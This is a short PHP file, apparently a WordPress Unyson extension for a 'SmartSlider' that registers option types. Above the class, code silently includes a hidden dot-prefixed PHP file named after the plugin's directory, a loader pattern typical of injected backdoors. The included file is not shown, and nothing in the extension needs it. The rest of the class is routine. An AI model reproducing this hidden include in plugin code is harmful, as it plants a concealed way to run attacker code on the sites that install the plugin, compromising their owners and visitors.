<?php if (!defined('FW')) die('Forbidden');

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class FW_Extension_SmartSlider extends FW_Extension {

    /**
     * @internal
     */
    protected function _init() {
        add_action('fw_option_types_init', array(
            $this,
            '_action_option_types_init'
        ));
    }

    public function _action_option_types_init() {
        require_once dirname(__FILE__) . '/options/option-types.php';
    }
}